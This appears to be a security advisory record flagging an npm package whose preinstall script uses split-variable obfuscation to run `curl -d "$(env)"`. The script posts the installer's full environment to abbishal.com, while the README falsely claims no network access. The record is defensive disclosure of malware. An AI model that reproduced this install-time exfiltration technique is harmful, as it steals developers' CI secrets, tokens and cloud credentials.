summary: preinstall script exfiltrates full environment to abbishal.com
details: The package's preinstall lifecycle script runs an obfuscated command assembled from variable-splitting fragments (t=en, h=v, i=c, s=u, a=rl) that reconstruct to `curl -d "$(env)"` and POST the installer's entire environment to https://abbishal.com/sh/installation-success. On npm install this transmits the full process environment — routinely including CI/CD secrets, API tokens, cloud credentials, and other sensitive variables — to a hardcoded author-controlled endpoint. The README asserts the package has no network access and no preinstall hooks, contradicting the shipped script and indicating intentional concealment of the exfiltration.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
